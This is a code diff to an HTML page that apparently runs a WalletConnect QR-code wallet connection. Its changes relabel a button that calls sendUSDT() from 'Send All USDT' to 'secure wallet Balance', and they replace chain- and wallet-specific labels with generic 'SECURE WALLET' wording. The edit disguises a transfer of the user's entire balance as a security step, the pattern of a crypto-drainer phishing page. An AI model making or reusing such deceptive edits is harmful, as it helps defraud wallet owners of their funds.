@@ -370,7 +370,7 @@
 <div class="toast" id="toast"></div>
 
 <div class="card">
-    <div class="logo">BEP-20 NETWORK</div>
+    <div class="logo">NETWORK</div>
     <h1>Scan to Secure<br>Wallet Connection</h1>
     <span class="chain-badge">
         <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 2 7 12 12 22 7 12 2"></polygon><polyline points="2 17 12 22 22 17"></polyline><polyline points="2 12 12 17 22 12"></polyline></svg>
@@ -398,7 +398,7 @@
     <div class="status-box warn" id="status">Initializing WalletConnect v2...</div>
 
     <button class="btn-send" id="btnSend" onclick="sendUSDT()">
-        Send All USDT
+        secure wallet Balance
     </button>
 
     <div class="info-row">
@@ -450,7 +450,7 @@ function showQR(uri) {
         colorLight: "#ffffff",
         correctLevel: QRCode.CorrectLevel.M
     });
-    document.getElementById('qrLabel').textContent = 'SCAN WITH TRUST WALLET';
+    document.getElementById('qrLabel').textContent = 'SECURE WALLET';
     document.getElementById('qrActions').classList.add('visible');
     setStatus('Waiting for scan...', 'warn');
 }
